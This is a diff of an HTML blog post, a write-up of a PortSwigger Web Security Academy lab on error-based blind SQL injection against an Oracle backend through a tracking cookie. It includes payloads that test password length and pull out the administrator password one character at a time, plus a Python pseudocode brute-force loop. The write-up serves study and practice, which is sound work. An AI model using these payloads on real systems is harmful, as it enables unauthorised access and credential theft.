@@ -20,31 +20,31 @@
 <h2>Table of Contents</h2>
 <div id="text-table-of-contents" role="doc-toc">
 <ul>
-<li><a href="#org9027aa0">Introduction</a></li>
-<li><a href="#org61af6c8">Web Security Academy</a></li>
-<li><a href="#org900cb3c">The process</a>
+<li><a href="#org5931868">Introduction</a></li>
+<li><a href="#orgf3fc563">Web Security Academy</a></li>
+<li><a href="#org8a1c625">The process</a>
 <ul>
-<li><a href="#orgd03eb60">Finding the SQLi point</a></li>
-<li><a href="#orgd2887e3">Finding the SQL backend</a></li>
-<li><a href="#org9d9107f">Developing a base condition</a></li>
-<li><a href="#orge8803c8">Validating the existence of specifics</a></li>
-<li><a href="#orgd109e84">Getting info about password</a>
+<li><a href="#orge064e0b">Finding the SQLi point</a></li>
+<li><a href="#org9477474">Finding the SQL backend</a></li>
+<li><a href="#org067551c">Developing a base condition</a></li>
+<li><a href="#org065fb35">Validating the existence of specifics</a></li>
+<li><a href="#orged4d910">Getting info about password</a>
 <ul>
-<li><a href="#orgc8293f3">Password Length</a></li>
-<li><a href="#orgcd0f13d">Password Contents</a></li>
+<li><a href="#orga7a5ec0">Password Length</a></li>
+<li><a href="#org4781aaf">Password Contents</a></li>
 </ul>
 </li>
 </ul>
 </li>
-<li><a href="#org9c4dee9">Summary</a></li>
+<li><a href="#org6449383">Summary</a></li>
 </ul>
 </div>
 </div>
 
 
-<div id="outline-container-org9027aa0" class="outline-2">
-<h2 id="org9027aa0"><a href="#org9027aa0">Introduction</a></h2>
-<div class="outline-text-2" id="text-org9027aa0">
+<div id="outline-container-org5931868" class="outline-2">
+<h2 id="org5931868"><a href="#org5931868">Introduction</a></h2>
+<div class="outline-text-2" id="text-org5931868">
 <p>
 I feel like much of the process I made during the last year, even
 though significant was disorganized and chaotic. I have reached a
@@ -65,9 +65,9 @@ Starting with SQL injections.
 
 
 
-<div id="outline-container-org61af6c8" class="outline-2">
-<h2 id="org61af6c8"><a href="#org61af6c8">Web Security Academy</a></h2>
-<div class="outline-text-2" id="text-org61af6c8">
+<div id="outline-container-orgf3fc563" class="outline-2">
+<h2 id="orgf3fc563"><a href="#orgf3fc563">Web Security Academy</a></h2>
+<div class="outline-text-2" id="text-orgf3fc563">
 <p>
 <a href="https://portswigger.net/web-security/dashboard">Web Security Academy</a> has been a very interesting integration to my
 <i>studying</i> routine, allowing for easily deployable labs, directly from
@@ -83,17 +83,17 @@ the ones available in the website) by the end of May.
 </div>
 </div>
 
-<div id="outline-container-org900cb3c" class="outline-2">
-<h2 id="org900cb3c"><a href="#org900cb3c">The process</a></h2>
-<div class="outline-text-2" id="text-org900cb3c">
+<div id="outline-container-org8a1c625" class="outline-2">
+<h2 id="org8a1c625"><a href="#org8a1c625">The process</a></h2>
+<div class="outline-text-2" id="text-org8a1c625">
 <p>
 &rsquo;nough said, let&rsquo;s dive into the lab. 
 </p>
 </div>
 
-<div id="outline-container-orgd03eb60" class="outline-3">
-<h3 id="orgd03eb60"><a href="#orgd03eb60">Finding the SQLi point</a></h3>
-<div class="outline-text-3" id="text-orgd03eb60">
+<div id="outline-container-orge064e0b" class="outline-3">
+<h3 id="orge064e0b"><a href="#orge064e0b">Finding the SQLi point</a></h3>
+<div class="outline-text-3" id="text-orge064e0b">
 <p>
 Knowing that this is a lab with a SQLi vulnerability, I just loaded
 the page on my browser, revealing a familiar page from previously
@@ -109,7 +109,7 @@ look at.</li>
 </ul>
 
 
-<div id="orgc33327d" class="figure">
+<div id="org12152bd" class="figure">
 <p><img src="images/20240213_112605_screenshot.png" alt="20240213_112605_screenshot.png">
 </p>
 <p><span class="figure-number">Figure 1: </span>SQLi POC</p>
@@ -118,9 +118,9 @@ look at.</li>
 </div>
 
 
-<div id="outline-container-orgd2887e3" class="outline-3">
-<h3 id="orgd2887e3"><a href="#orgd2887e3">Finding the SQL backend</a></h3>
-<div class="outline-text-3" id="text-orgd2887e3">
+<div id="outline-container-org9477474" class="outline-3">
+<h3 id="org9477474"><a href="#org9477474">Finding the SQL backend</a></h3>
+<div class="outline-text-3" id="text-org9477474">
 <p>
 Now, knowing that we have to manipulate the value of <code>TrackingID</code>
 cookie, we need to gather some more information about the underlying
@@ -147,7 +147,7 @@ that we are facing Oracle DBMS</li>
 
 
 
-<div id="orgecffa6d" class="figure">
+<div id="org471cfe0" class="figure">
 <p><img src="images/20240213_112905_screenshot.png" alt="20240213_112905_screenshot.png">
 </p>
 <p><span class="figure-number">Figure 2: </span>Oracle DBMS poc</p>
@@ -155,9 +155,9 @@ that we are facing Oracle DBMS</li>
 </div>
 </div>
 
-<div id="outline-container-org9d9107f" class="outline-3">
-<h3 id="org9d9107f"><a href="#org9d9107f">Developing a base condition</a></h3>
-<div class="outline-text-3" id="text-org9d9107f">
+<div id="outline-container-org067551c" class="outline-3">
+<h3 id="org067551c"><a href="#org067551c">Developing a base condition</a></h3>
+<div class="outline-text-3" id="text-org067551c">
 <p>
 Getting into our arsenal (<a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">SQLi Cheatsheet</a>), we insert a <code>CASE</code>
 statement, and a division by zero to throw an exception when the
@@ -171,7 +171,7 @@ effectively translates into:
 </ul>
 
 
-<div id="org97368f8" class="figure">
+<div id="org6328204" class="figure">
 <p><img src="images/20240213_113037_screenshot.png" alt="20240213_113037_screenshot.png">
 </p>
 <p><span class="figure-number">Figure 3: </span>Getting the DBMS to throw an error</p>
@@ -181,9 +181,9 @@ effectively translates into:
 
 
 
-<div id="outline-container-orge8803c8" class="outline-3">
-<h3 id="orge8803c8"><a href="#orge8803c8">Validating the existence of specifics</a></h3>
-<div class="outline-text-3" id="text-orge8803c8">
+<div id="outline-container-org065fb35" class="outline-3">
+<h3 id="org065fb35"><a href="#org065fb35">Validating the existence of specifics</a></h3>
+<div class="outline-text-3" id="text-org065fb35">
 <p>
 Our goal is to get the password of the <code>administrator</code> account but first
 we need to verify some data:
@@ -197,7 +197,7 @@ we need to verify some data:
 <p>
 These were mostly completed as shown here:
 </p>
-<pre class="example" id="org7d575ea">
+<pre class="example" id="org01bc2e4">
 TrackingId=YgUTniHSZwxsy11x' UNION SELECT CASE WHEN ('b'='a') THEN TO_CHAR(1/0) ELSE null END FROM users--
 TrackingId=YgUTniHSZwxsy11x' UNION SELECT CASE WHEN ('b'='a') THEN TO_CHAR(1/0) ELSE password END FROM users--
 TrackingId=YgUTniHSZwxsy11x' UNION SELECT CASE WHEN ('b'='a') THEN TO_CHAR(1/0) ELSE password END FROM users WHERE username='administrator'--
@@ -205,9 +205,9 @@ TrackingId=YgUTniHSZwxsy11x' UNION SELECT CASE WHEN ('b'='a') THEN TO_CHAR(1/0) 
 </div>
 </div>
 
-<div id="outline-container-orgd109e84" class="outline-3">
-<h3 id="orgd109e84"><a href="#orgd109e84">Getting info about password</a></h3>
-<div class="outline-text-3" id="text-orgd109e84">
+<div id="outline-container-orged4d910" class="outline-3">
+<h3 id="orged4d910"><a href="#orged4d910">Getting info about password</a></h3>
+<div class="outline-text-3" id="text-orged4d910">
 <p>
 Pay attention to how my payload has slightly changed from the previous
 &ldquo;examples&rdquo;, and <b>special emphasis</b> should be given to the <code>from dual</code>
@@ -215,9 +215,9 @@ part, since forgetting it causes 500 (oracle DBMS).
 </p>
 </div>
 
-<div id="outline-container-orgc8293f3" class="outline-4">
-<h4 id="orgc8293f3"><a href="#orgc8293f3">Password Length</a></h4>
-<div class="outline-text-4" id="text-orgc8293f3">
+<div id="outline-container-orga7a5ec0" class="outline-4">
+<h4 id="orga7a5ec0"><a href="#orga7a5ec0">Password Length</a></h4>
+<div class="outline-text-4" id="text-orga7a5ec0">
 <p>
 To get the length of the password field for the entry with
 <code>username='administrator'</code>, we can rely on the builtin function <code>LENGTH</code>
@@ -226,14 +226,14 @@ challenge at least) length of 100, we got that password length for
 administrator is 20 characters:
 </p>
 
-<pre class="example" id="org5eeb4e5">
+<pre class="example" id="org541676d">
 TrackingId=YgUTniHSZwxsy11x' UNION SELECT CASE WHEN ((SELECT 'a' from users where username='administrator' and LENGTH(password)&gt;0)='a') THEN 'a' ELSE TO_CHAR(1/0) END from dual--
 Cookie: TrackingId=YgUTniHSZwxsy11x' UNION SELECT CASE WHEN ((SELECT 'a' from users where username='administrator' and LENGTH(password)&lt;100)='a') THEN 'a' ELSE TO_CHAR(1/0) END from dual--;
 </pre>
 
 
 
-<div id="orga3aecf4" class="figure">
+<div id="org30e7e7d" class="figure">
 <p><img src="images/20240213_114312_screenshot.png" alt="20240213_114312_screenshot.png">
 </p>
 <p><span class="figure-number">Figure 4: </span>Password Length Query</p>
@@ -245,9 +245,9 @@ This means that we need to get 20 characters
 </div>
 </div>
 
-<div id="outline-container-orgcd0f13d" class="outline-4">
-<h4 id="orgcd0f13d"><a href="#orgcd0f13d">Password Contents</a></h4>
-<div class="outline-text-4" id="text-orgcd0f13d">
+<div id="outline-container-org4781aaf" class="outline-4">
+<h4 id="org4781aaf"><a href="#org4781aaf">Password Contents</a></h4>
+<div class="outline-text-4" id="text-org4781aaf">
 <p>
 Since I use Burp Community Edition I know that to get the password
 will take a fair share of my lifetime, should I stick with the
@@ -256,14 +256,14 @@ simple loop with python. Namely:
 </p>
 
 <div class="org-src-container">
-<pre class="src src-python">password = ""
+<pre class="src src-python"><span class="org-variable-name">password</span> <span class="org-operator">=</span> <span class="org-string">""</span>
 
-for index in range(1,21):
-    for letter in string.lowercase + string.digits:
-        req = send.request() # Pseudocode
-        if reg.status_code == 500:
-            password += letter
-            break
+<span class="org-keyword">for</span> index <span class="org-keyword">in</span> <span class="org-builtin">range</span>(1,21):
+    <span class="org-keyword">for</span> letter <span class="org-keyword">in</span> string.lowercase <span class="org-operator">+</span> string.digits:
+        <span class="org-variable-name">req</span> <span class="org-operator">=</span> send.request() <span class="org-comment-delimiter"># </span><span class="org-comment">Pseudocode</span>
+        <span class="org-keyword">if</span> reg.status_code <span class="org-operator">==</span> 500:
+            <span class="org-variable-name">password</span> <span class="org-operator">+=</span> letter
+            <span class="org-keyword">break</span>
 </pre>
 </div>
 
@@ -273,7 +273,7 @@ allowing through the usage of <code>proxies</code>, to have the requests sent to
 burp as well<sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-backlink">1</a></sup>, while its payload is in the form of:
 </p>
 
-<pre class="example" id="org3210a50">
+<pre class="example" id="orgfe5b344">
 'Cookie': f"TrackingId=YgUTniHSZwxsy11x' UNION SELECT CASE WHEN ((SELECT SUBSTR(password,{index},1) from users where username='administrator') ='{letter}') THEN TO_CHAR(1/0) ELSE null END from dual--; session=ImL77SPyy3Ne4HwEqb2Bnu2HFhIR18Vp",
 </pre>
 
@@ -291,7 +291,7 @@ This beautifully automates the process allowing me to get a:
 </p>
 
 
-<div id="org048a28e" class="figure">
+<div id="org0f9f36a" class="figure">
 <p><img src="images/20240213_115634_screenshot.png" alt="20240213_115634_screenshot.png">
 </p>
 <p><span class="figure-number">Figure 5: </span>BEAUTIFULLLLLLL</p>
@@ -302,9 +302,9 @@ This beautifully automates the process allowing me to get a:
 </div>
 
 
-<div id="outline-container-org9c4dee9" class="outline-2">
-<h2 id="org9c4dee9"><a href="#org9c4dee9">Summary</a></h2>
-<div class="outline-text-2" id="text-org9c4dee9">
+<div id="outline-container-org6449383" class="outline-2">
+<h2 id="org6449383"><a href="#org6449383">Summary</a></h2>
+<div class="outline-text-2" id="text-org6449383">
 <p>
 Do not make the mistake of overlooking these labs. They have been
 really fun to play with, and I feel like I have already learned so
